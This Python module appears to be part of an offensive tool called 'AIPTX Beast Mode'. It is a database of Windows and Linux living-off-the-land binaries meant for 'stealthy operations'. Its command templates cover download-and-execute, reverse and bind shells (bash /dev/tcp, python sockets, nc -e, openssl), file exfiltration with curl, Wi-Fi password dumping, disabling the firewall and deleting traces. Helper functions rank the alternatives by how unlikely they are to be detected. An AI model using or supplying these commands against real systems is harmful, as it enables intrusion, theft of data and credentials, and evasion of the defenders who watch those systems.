"""
AIPTX Beast Mode - LOLBins Database
===================================

Living-off-the-Land Binaries for stealthy operations.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class LOLBin:
    """A Living-off-the-Land binary."""
    name: str
    os: str  # windows, linux, both
    path: str
    capabilities: list[str]
    commands: dict[str, str]
    description: str = ""
    detection_risk: str = "low"  # low, medium, high
    metadata: dict[str, Any] = field(default_factory=dict)


# Windows LOLBins database
WINDOWS_LOLBINS = {
    # Download
    "certutil": LOLBin(
        name="certutil",
        os="windows",
        path="C:\\Windows\\System32\\certutil.exe",
        capabilities=["download", "encode", "decode"],
        commands={
            "download": "certutil -urlcache -split -f <url> <output>",
            "base64_encode": "certutil -encode <input> <output>",
            "base64_decode": "certutil -decode <input> <output>",
            "download_silent": "certutil -urlcache -split -f <url> <output> & del /f certutil*",
        },
        description="Certificate utility - can download files and encode/decode",
        detection_risk="medium",
    ),
    "bitsadmin": LOLBin(
        name="bitsadmin",
        os="windows",
        path="C:\\Windows\\System32\\bitsadmin.exe",
        capabilities=["download"],
        commands={
            "download": "bitsadmin /transfer job /download /priority high <url> <output>",
            "download_ps": "Start-BitsTransfer -Source <url> -Destination <output>",
        },
        description="Background transfer utility",
        detection_risk="medium",
    ),
    "curl": LOLBin(
        name="curl",
        os="windows",
        path="C:\\Windows\\System32\\curl.exe",
        capabilities=["download", "upload", "http_request"],
        commands={
            "download": "curl -o <output> <url>",
            "upload": "curl -X POST -d @<file> <url>",
            "silent_download": "curl -s -o <output> <url>",
        },
        description="cURL (built into Windows 10+)",
        detection_risk="low",
    ),

    # Execution
    "mshta": LOLBin(
        name="mshta",
        os="windows",
        path="C:\\Windows\\System32\\mshta.exe",
        capabilities=["execute", "download_execute"],
        commands={
            "execute_hta": "mshta <url_or_file>.hta",
            "inline_vbs": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"<command>\"\", 0:close\")",
            "inline_js": "mshta javascript:a=GetObject(\"script:<url>\").Exec():close()",
        },
        description="HTML Application Host",
        detection_risk="high",
    ),
    "rundll32": LOLBin(
        name="rundll32",
        os="windows",
        path="C:\\Windows\\System32\\rundll32.exe",
        capabilities=["execute", "dll_load"],
        commands={
            "execute_dll": "rundll32.exe <dll>,<entrypoint>",
            "javascript": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"<command>\")",
            "shell32": "rundll32.exe shell32.dll,ShellExec_RunDLL <program>",
        },
        description="DLL execution utility",
        detection_risk="medium",
    ),
    "regsvr32": LOLBin(
        name="regsvr32",
        os="windows",
        path="C:\\Windows\\System32\\regsvr32.exe",
        capabilities=["execute", "download_execute"],
        commands={
            "register_dll": "regsvr32 /s /n /u /i:<url>.sct scrobj.dll",
            "execute_sct": "regsvr32 /s /n /u /i:<file>.sct scrobj.dll",
        },
        description="COM registration - can execute scriptlets",
        detection_risk="high",
    ),
    "wmic": LOLBin(
        name="wmic",
        os="windows",
        path="C:\\Windows\\System32\\wbem\\WMIC.exe",
        capabilities=["execute", "recon", "lateral"],
        commands={
            "process_create": "wmic process call create \"<command>\"",
            "remote_exec": "wmic /node:<target> process call create \"<command>\"",
            "list_processes": "wmic process list brief",
            "system_info": "wmic os get caption,version",
        },
        description="WMI command-line interface",
        detection_risk="medium",
    ),
    "cscript": LOLBin(
        name="cscript",
        os="windows",
        path="C:\\Windows\\System32\\cscript.exe",
        capabilities=["execute"],
        commands={
            "execute_vbs": "cscript //nologo <script>.vbs",
            "execute_js": "cscript //nologo <script>.js",
        },
        description="Console script host",
        detection_risk="medium",
    ),
    "msiexec": LOLBin(
        name="msiexec",
        os="windows",
        path="C:\\Windows\\System32\\msiexec.exe",
        capabilities=["execute", "download_execute"],
        commands={
            "install_local": "msiexec /q /i <file>.msi",
            "install_url": "msiexec /q /i <url>",
            "extract": "msiexec /a <file>.msi /qb TARGETDIR=<dir>",
        },
        description="MSI installer",
        detection_risk="medium",
    ),

    # PowerShell alternatives
    "powershell": LOLBin(
        name="powershell",
        os="windows",
        path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        capabilities=["execute", "download", "encode"],
        commands={
            "download_execute": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('<url>')\"",
            "encoded": "powershell -enc <base64_command>",
            "hidden": "powershell -WindowStyle Hidden -ep bypass -c \"<command>\"",
            "download_file": "powershell -c \"(New-Object Net.WebClient).DownloadFile('<url>','<output>')\"",
        },
        description="PowerShell - primary scripting tool",
        detection_risk="medium",
    ),

    # Recon
    "netsh": LOLBin(
        name="netsh",
        os="windows",
        path="C:\\Windows\\System32\\netsh.exe",
        capabilities=["recon", "portforward"],
        commands={
            "wifi_passwords": "netsh wlan show profiles name=* key=clear",
            "portproxy": "netsh interface portproxy add v4tov4 listenport=<lport> listenaddress=0.0.0.0 connectport=<rport> connectaddress=<rhost>",
            "firewall_off": "netsh advfirewall set allprofiles state off",
        },
        description="Network configuration utility",
        detection_risk="low",
    ),
}

# Linux LOLBins database
LINUX_LOLBINS = {
    "curl": LOLBin(
        name="curl",
        os="linux",
        path="/usr/bin/curl",
        capabilities=["download", "upload", "http_request"],
        commands={
            "download": "curl -o <output> <url>",
            "download_execute": "curl -s <url> | bash",
            "upload": "curl -X POST -F 'file=@<file>' <url>",
            "exfil": "curl -d @<file> <url>",
        },
        description="Data transfer tool",
        detection_risk="low",
    ),
    "wget": LOLBin(
        name="wget",
        os="linux",
        path="/usr/bin/wget",
        capabilities=["download"],
        commands={
            "download": "wget -O <output> <url>",
            "download_execute": "wget -q -O - <url> | bash",
            "background": "wget -b -O <output> <url>",
        },
        description="Web downloader",
        detection_risk="low",
    ),
    "python": LOLBin(
        name="python",
        os="linux",
        path="/usr/bin/python3",
        capabilities=["execute", "download", "reverse_shell"],
        commands={
            "http_server": "python3 -m http.server <port>",
            "download": "python3 -c \"import urllib.request; urllib.request.urlretrieve('<url>','<output>')\"",
            "reverse_shell": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "execute_url": "python3 -c \"import urllib.request; exec(urllib.request.urlopen('<url>').read())\"",
        },
        description="Python interpreter",
        detection_risk="low",
    ),
    "nc": LOLBin(
        name="nc",
        os="linux",
        path="/usr/bin/nc",
        capabilities=["reverse_shell", "bind_shell", "transfer"],
        commands={
            "reverse_shell": "nc -e /bin/sh <ip> <port>",
            "bind_shell": "nc -lvp <port> -e /bin/sh",
            "file_transfer": "nc <ip> <port> < <file>",
            "receive_file": "nc -lvp <port> > <output>",
        },
        description="Netcat - network Swiss Army knife",
        detection_risk="medium",
    ),
    "bash": LOLBin(
        name="bash",
        os="linux",
        path="/bin/bash",
        capabilities=["reverse_shell", "execute"],
        commands={
            "reverse_shell": "bash -i >& /dev/tcp/<ip>/<port> 0>&1",
            "reverse_shell_alt": "bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'",
            "execute_url": "bash -c \"$(curl -s <url>)\"",
        },
        description="Bourne Again Shell",
        detection_risk="low",
    ),
    "ssh": LOLBin(
        name="ssh",
        os="linux",
        path="/usr/bin/ssh",
        capabilities=["tunnel", "execute", "forward"],
        commands={
            "socks_proxy": "ssh -D <port> -N -f user@host",
            "local_forward": "ssh -L <lport>:<rhost>:<rport> user@host",
            "remote_forward": "ssh -R <rport>:<lhost>:<lport> user@host",
            "execute_command": "ssh user@host '<command>'",
        },
        description="Secure Shell",
        detection_risk="low",
    ),
    "openssl": LOLBin(
        name="openssl",
        os="linux",
        path="/usr/bin/openssl",
        capabilities=["encode", "encrypt", "reverse_shell"],
        commands={
            "base64_encode": "openssl base64 -in <input> -out <output>",
            "base64_decode": "openssl base64 -d -in <input> -out <output>",
            "encrypt_file": "openssl enc -aes-256-cbc -salt -in <input> -out <output>",
            "reverse_shell": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -connect <ip>:<port> > /tmp/s; rm /tmp/s",
        },
        description="OpenSSL toolkit",
        detection_risk="low",
    ),
    "tar": LOLBin(
        name="tar",
        os="linux",
        path="/bin/tar",
        capabilities=["execute", "archive"],
        commands={
            "execute_on_extract": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "create_archive": "tar -czvf <output>.tar.gz <dir>",
            "extract": "tar -xzvf <archive>",
        },
        description="Tar archiver with command execution",
        detection_risk="low",
    ),
}


class LOLBinDatabase:
    """
    Database of Living-off-the-Land binaries.

    Provides lookup and conversion capabilities for
    using built-in OS tools instead of custom binaries.
    """

    def __init__(self, os_type: str = "linux"):
        """
        Initialize LOLBin database.

        Args:
            os_type: Target operating system
        """
        self.os_type = os_type.lower()
        if self.os_type == "windows":
            self._lolbins = WINDOWS_LOLBINS
        else:
            self._lolbins = LINUX_LOLBINS

    def get_lolbin(self, name: str) -> LOLBin | None:
        """Get a LOLBin by name."""
        return self._lolbins.get(name)

    def find_by_capability(self, capability: str) -> list[LOLBin]:
        """Find LOLBins with a specific capability."""
        return [
            lolbin for lolbin in self._lolbins.values()
            if capability in lolbin.capabilities
        ]

    def get_alternative_command(
        self,
        original_command: str,
        capability: str,
    ) -> list[dict[str, str]]:
        """
        Get alternative LOLBin commands for an operation.

        Args:
            original_command: Original command to replace
            capability: Required capability

        Returns:
            List of alternative commands
        """
        alternatives = []
        lolbins = self.find_by_capability(capability)

        for lolbin in lolbins:
            for cmd_name, cmd_template in lolbin.commands.items():
                if capability in cmd_name or capability in cmd_template:
                    alternatives.append({
                        "lolbin": lolbin.name,
                        "path": lolbin.path,
                        "command": cmd_template,
                        "detection_risk": lolbin.detection_risk,
                        "description": lolbin.description,
                    })

        return sorted(alternatives, key=lambda x: x["detection_risk"])

    def convert_command(
        self,
        command: str,
        preferred_lolbin: str | None = None,
    ) -> str | None:
        """
        Convert a command to use LOLBin alternative.

        Args:
            command: Original command
            preferred_lolbin: Preferred LOLBin to use

        Returns:
            Converted command or None
        """
        # Detect command type
        if any(x in command.lower() for x in ["curl", "wget", "download"]):
            capability = "download"
        elif any(x in command.lower() for x in ["nc", "ncat", "shell"]):
            capability = "reverse_shell"
        elif any(x in command.lower() for x in ["base64", "encode"]):
            capability = "encode"
        else:
            return None

        alternatives = self.find_by_capability(capability)
        if preferred_lolbin:
            for alt in alternatives:
                if alt.name == preferred_lolbin:
                    return next(iter(alt.commands.values()))

        if alternatives:
            return next(iter(alternatives[0].commands.values()))

        return None

    def list_all(self) -> list[str]:
        """List all available LOLBins."""
        return list(self._lolbins.keys())


def get_lolbin_alternative(
    operation: str,
    os_type: str = "linux",
) -> list[dict[str, str]]:
    """
    Convenience function to get LOLBin alternatives.

    Args:
        operation: Desired operation (download, execute, encode)
        os_type: Target OS

    Returns:
        List of alternative commands
    """
    db = LOLBinDatabase(os_type)
    return db.get_alternative_command("", operation)


__all__ = [
    "LOLBin",
    "LOLBinDatabase",
    "WINDOWS_LOLBINS",
    "LINUX_LOLBINS",
    "get_lolbin_alternative",
]
